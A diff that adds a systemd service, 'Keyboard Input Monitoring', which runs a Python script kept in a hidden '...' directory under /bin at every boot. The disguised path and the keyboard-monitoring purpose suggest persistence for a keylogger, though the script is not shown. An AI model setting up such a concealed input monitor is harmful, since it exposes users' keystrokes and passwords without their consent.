@@ -1,0 +1,18 @@
+[Unit]
+Description=Keyboard Input Monitoring
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/bin/python3 /bin/systemd-keyboard/.../key_checker.py
+Restart=on-failure
+RestartSec=5
+StandardOutput=journal
+StandardError=journal
+SyslogIdentifier=keyboard-monitor
+
+# Light hardening (safe even as root)
+PrivateTmp=true
+
+[Install]
+WantedBy=multi-user.target
